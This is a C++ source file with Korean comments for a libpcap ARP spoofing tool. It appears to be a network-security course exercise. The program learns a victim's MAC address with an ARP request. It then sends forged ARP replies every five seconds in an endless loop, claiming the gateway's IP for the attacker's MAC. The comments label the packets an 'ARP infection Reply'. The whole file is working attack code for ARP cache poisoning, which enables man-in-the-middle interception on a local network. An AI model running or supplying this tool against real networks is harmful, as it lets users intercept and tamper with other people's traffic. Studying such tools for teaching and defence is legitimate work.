#include "pcap.h"
#include <cstdio>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test eth1 172.30.1.43 172.30.1.254\n");
}

void mac_str (char *rtn, u_char *mac);
int get_mac (char *device, char *mac);
int get_ip (char *device, char *my_ip);
int get_victim_mac (char *device, char *my_mac, char *victim_mac, char *victim_ip, char *my_ip);
int send_arp_reply (char *device, char *my_mac, char *victim_mac, char *victim_ip, char *target_ip);

struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
    }

    char *device = argv[1];   // eth1
    char *sender_ip = argv[2];  // 172.30.1.43
    char *target_ip = argv[3];  // 172.30.1.254
    int ret;

    // 1. get my mac, ip
    // get mac
    char my_mac[18];
    ret = get_mac(device, my_mac); // 0 : success
    if (ret < 0) return -1; // failed

    // get ip
    char my_ip[16];
    ret = get_ip(device, my_ip); // 0 : success
    if (ret < 0) return -1; // failed


    // 2. get victim mac
    char victim_mac[18];
    ret = get_victim_mac(device, my_mac, victim_mac, sender_ip, my_ip); // 0 : success
    if (ret < 0) return -1; // failed


    // 3. send ARP infection Reply packet
    while (true) {
        printf("send spoofing packet!\n");
        int ret = send_arp_reply(device, my_mac, victim_mac, sender_ip, target_ip);
        if (ret < 0) return -1;
        sleep(5); // 5초 단위로 보내기
    }

}

int get_mac(char *device, char *mac){
    // ifreq : linux에서 네트워크 장치의 설정과 관련된 대부분의 ioctl( ) 호출에 세번째 인자로 사용하는 구조체
    struct ifreq ifr;

    memset(&ifr, 0x00, sizeof(ifr));  // memset(시작주소, 값(1byte), size)
    strcpy(ifr.ifr_name, device); // ifr.ifr_name = eth1

    // Datagram socket
    int sock = socket(AF_UNIX, SOCK_DGRAM, 0); //socket(도메인 타입, 프로토콜) -1 반환시 소켓 생성 실패.
    if (sock < 0) {
        fprintf(stderr, "socket error\n");
        return -1;
    }

    // SIOCGIFHWADDR - 0x8927
    // Get Hardward Address
    // mac 주소 받아옴 - 1
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "ioctl error\n");
        return -1;
    }

    unsigned char *mac_addr = (unsigned char *) ifr.ifr_hwaddr.sa_data; // mac 주소 받아온 것 저장 - 2

    mac_str(mac, mac_addr); // 받아온 mac_addr을 mac 포인터에 저장 - 3
    printf("Get My MAC Address successfully!\n");
    close(sock);

    return 0;
}

int get_ip(char *device, char *my_ip){
    // ifreq : linux에서 네트워크 장치의 설정과 관련된 대부분의 ioctl( ) 호출에 세번째 인자로 사용하는 구조체
    struct ifreq ifr;

    memset(&ifr, 0x00, sizeof(ifr)); // memset(시작주소, 값(1byte), size)
    strcpy(ifr.ifr_name, device); // ifr.ifr_name = eth1

    int sock = socket(AF_INET, SOCK_DGRAM, 0);  //socket(도메인 타입, 프로토콜) -1 반환시 소켓 생성 실패
    if (sock < 0) {
        fprintf(stderr, "socket error\n");
        return -1;
    }

    // SIOCGIFADDR - 0x8915
    // Get PA Address
    // IP 주소 받아옴 - 1
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        fprintf(stderr, "ioctl error\n");
        return -1;
    }
    struct sockaddr_in *sin = (struct sockaddr_in*)&ifr.ifr_addr; // IP 주소 받아온 것 저장 - 2

    strcpy(my_ip, inet_ntoa(sin->sin_addr)); // 받아온 sin->addr을 my_ip포인터에 저장 - 3
    close(sock);
    printf("Get My IP Address successfully!\n");

    return 0;
}

void mac_str (char *rtn, u_char *mac) // convert 6 bytes mac address to string format
{
    snprintf(rtn, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2],
             mac[3], mac[4], mac[5]);
}

int get_victim_mac(char *device, char *my_mac, char *victim_mac, char *victim_ip, char *my_ip)
{
    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        return -1;
    }

    // send ARP Request
    EthArpPacket packet;

    // eth
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");   // broadcast
    packet.eth_.smac_ = Mac(my_mac);                // my mac address
    packet.eth_.type_ = htons(EthHdr::Arp);         // arp

    // arp
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);        // eth
    packet.arp_.pro_ = htons(EthHdr::Ip4);          // ipv4
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac);                // my mac
    packet.arp_.sip_ = htonl(Ip(my_ip));            // my ip
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");   // broadcast
    // victim_ip
    packet.arp_.tip_ = htonl(Ip(victim_ip));        // target. victim_ip


    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));  // 0 : success.  packet
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;                                                                                      // -1 : failed
    }

    // receive ARP Reply
    while (true) {
        struct pcap_pkthdr *pcap_header;
        const u_char *packet;
        // 이더넷 헤더 받음
        int res = pcap_next_ex(handle, &pcap_header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex error (%d) %s\n", res, pcap_geterr(handle));
            return res;
        }

        struct EthArpPacket *eth_arp = (struct EthArpPacket *)packet;
        struct in_addr s;

        s.s_addr = ntohl(eth_arp->arp_.sip());
        char *sip = inet_ntoa(s);

        // 받은 이더넷 헤더와 비교
        if (eth_arp->eth_.type_ != htons(EthHdr::Arp)) continue;
        if (eth_arp->arp_.op_ != htons(ArpHdr::Reply)) continue; // Request/Reply
        if (strncmp(sip, victim_ip, strlen(victim_ip)) != 0) continue;

        printf("Catch Victim's MAC address successfully! \n");
        mac_str(victim_mac, eth_arp->arp_.smac_); // victim_mac에 저장!

        break;
    }
    return 0;
}

int send_arp_reply(char *device, char *my_mac, char *victim_mac, char *victim_ip, char *target_ip)
{
    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        return -1;
    }

    EthArpPacket packet;

    /* victim */
    packet.eth_.dmac_ = Mac(victim_mac);        // victim

    packet.eth_.smac_ = Mac(my_mac);            // attacker
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(my_mac);            // attacker
    packet.arp_.sip_ = htonl(Ip(target_ip));    // gateway

    /* victim */
    packet.arp_.tmac_ = Mac(victim_mac);        // victim
    packet.arp_.tip_ = htonl(Ip(victim_ip));    // victim

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;
}
